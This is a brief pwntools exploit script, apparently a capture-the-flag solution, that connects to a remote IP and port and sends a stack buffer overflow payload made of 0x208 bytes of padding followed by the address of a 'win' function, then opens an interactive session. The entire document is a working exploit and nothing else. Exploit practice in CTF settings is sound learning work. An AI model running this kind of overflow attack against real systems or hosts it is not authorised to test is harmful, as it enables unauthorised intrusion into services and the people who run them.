from pwn import *

BINARY = "chall"

context.binary = BINARY
elf = context.binary

# p = elf.process()
p = remote("34.76.206.46", 10002)

OFFSET = 0x200 + 8

payload = cyclic(OFFSET)
payload += p64(elf.symbols["win"])

p.sendlineafter(b"Enter your name:\n", payload)
p.interactive()
